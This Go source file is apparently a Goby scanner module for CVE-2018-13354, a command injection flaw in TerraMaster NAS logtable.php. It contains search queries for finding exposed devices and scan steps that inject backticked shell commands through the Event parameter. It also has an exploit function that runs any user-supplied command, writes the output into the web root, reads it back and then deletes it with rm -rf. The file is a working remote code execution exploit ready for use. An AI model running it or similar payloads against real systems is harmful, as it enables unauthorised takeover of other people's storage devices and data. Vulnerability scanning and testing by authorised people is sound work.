package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
)

func init() {
	expJson := `{
    "Name": "TerraMaster NAS logtable RCE (CVE-2018–13354)",
    "Description": "TerraMaster TOS has rce in logtable",
    "Impact": "TerraMaster NAS logtable RCE (CVE-2018–13354)",
    "Recommendation": "<p><a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p>",
    "Product": "TerraMaster-NAS",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "TerraMaster网络存储系统logtable.php文件Event参数命令执行",
            "Description": "TerraMaster TOS是美国铁威马（Terra Master）公司的一套基于Linux平台开发的存储服务器专用操作系统。该系统支持文件共享、云端数据同步、数据备份和虚拟化等功能。 TerraMaster TOS的logtable.php文件的Event参数存在系统命令注入漏洞。攻击者可在创建新用户过程中借助‘Event’参数利用该漏洞执行系统命令。",
            "Impact": "<p>TerraMaster TOS是美国铁威马（Terra Master）公司的一套基于Linux平台开发的存储服务器专用操作系统。<br></p><p>TerraMaster TOS的logtable.php文件的Event参数存在系统命令注入漏洞，该漏洞源于没有对logtable.php文件的的Event参数的用户输入进行过滤或校验等操作，直接将用户输入拼接执行，攻击者可利用此漏洞获取设备的管理员权限，攻陷设备，也可以获取数据库配置文件或系统文件。<br></p>",
            "Recommendation": "<p>官方已修复该漏洞，请用户下载补丁修复漏洞：<a href=\"https://www.terra-master.com/cn/\" target=\"_blank\">https://www.terra-master.com/cn/</a><br></p>",
            "Product": "TERRAMASTER-NAS",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TerraMaster NAS logtable RCE (CVE-2018–13354)",
            "Description": "TerraMaster TOS has rce in logtable",
            "Impact": "TerraMaster NAS logtable RCE (CVE-2018–13354)",
            "Recommendation": "<p><a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p>",
            "Product": "TerraMaster-NAS",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(((body=\"window.open('http://www.terra-master.com/','_blank');\" || (body=\"NAS Setup\" && body=\"X-UA-Compatible\" && body=\"nas.cgi\") || (title=\"TerraMaster\" && body=\"connfailed\") || ((body=\"class=\\\"cloud-logo\\\"\" || title=\"TerraMaster 系统管理\") && body=\"class=\\\"newlogo pngFix\\\"\")) && body!=\"Server: couchdb\") || banner=\"X-Powered-By: TerraMaster\") || (title=\"TerraMaster system management\" || body=\"TerraMaster<br>管理登录\" || title=\"TerraMaster 系统管理\" || body=\"type=\\\"hidden\\\" name=\\\"connfailed\\\" value=\\\"数据库连接失败!\\\" />\" || title=\"TerraMaster setup manager\") || ((body=\"class=\\\"cloud-logo\\\"\" || title=\"TerraMaster 系统管理\") && body=\"class=\\\"newlogo pngFix\\\"\")",
    "GobyQuery": "(((body=\"window.open('http://www.terra-master.com/','_blank');\" || (body=\"NAS Setup\" && body=\"X-UA-Compatible\" && body=\"nas.cgi\") || (title=\"TerraMaster\" && body=\"connfailed\") || ((body=\"class=\\\"cloud-logo\\\"\" || title=\"TerraMaster 系统管理\") && body=\"class=\\\"newlogo pngFix\\\"\")) && body!=\"Server: couchdb\") || banner=\"X-Powered-By: TerraMaster\") || (title=\"TerraMaster system management\" || body=\"TerraMaster<br>管理登录\" || title=\"TerraMaster 系统管理\" || body=\"type=\\\"hidden\\\" name=\\\"connfailed\\\" value=\\\"数据库连接失败!\\\" />\" || title=\"TerraMaster setup manager\") || ((body=\"class=\\\"cloud-logo\\\"\" || title=\"TerraMaster 系统管理\") && body=\"class=\\\"newlogo pngFix\\\"\")",
    "Author": "ooppeed@tom.com",
    "Homepage": "https://www.terra-master.com/cn/",
    "DisclosureDate": "2021-06-11",
    "References": [
        "https://vuldb.com/?id.127200"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2018–13354"
    ],
    "CNVD": [
        "CNVD-2018-26663"
    ],
    "CNNVD": [
        "CNNVD-201811-813"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/include/ajax/logtable.php",
                "follow_redirect": false,
                "header": {
                    "Content-Length": "35",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip deflate",
                    "Accept-Language": "zh-CNzh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "tab=gettotal&Event=%60echo%20LISENSEBSDCMAUT>/mnt/base/www/ppp%60&table=access_syslog"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "==",
                        "value": "0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/ppp",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "LISENSEBSDCMAUT",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/include/ajax/logtable.php",
                "follow_redirect": false,
                "header": {
                    "Content-Length": "35",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip deflate",
                    "Accept-Language": "zh-CNzh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "tab=gettotal&Event=%60rm%20-rf%20/mnt/base/www/ppp%60&table=access_syslog"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/include/ajax/logtable.php",
                "follow_redirect": false,
                "header": {
                    "Content-Length": "35",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip deflate",
                    "Accept-Language": "zh-CNzh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "tab=gettotal&Event=%60echo%20LISENSEBSDCMAUT>/mnt/base/www/ppp%60&table=access_syslog"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "==",
                        "value": "0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/ppp",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "LISENSEBSDCMAUT",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/include/ajax/logtable.php",
                "follow_redirect": false,
                "header": {
                    "Content-Length": "35",
                    "Accept": "*/*",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip deflate",
                    "Accept-Language": "zh-CNzh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "tab=gettotal&Event=%60rm%20-rf%20/mnt/base/www/ppp%60&table=access_syslog"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ls /",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/include/ajax/logtable.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "tab=gettotal&Event=%60" + url.QueryEscape(cmd) + ">/mnt/base/www/ppp%60&table=access_syslog"
			httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			cfg2 := httpclient.NewGetRequestConfig("/ppp")
			cfg2.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				cfg.Data = "tab=gettotal&Event=%60rm%20-rf%20/mnt/base/www/ppp%60&table=access_syslog"
				httpclient.DoHttpRequest(expResult.HostInfo, cfg)
				expResult.Output = resp.RawBody
				expResult.Success = true
			}
			return expResult
		},
	))
}
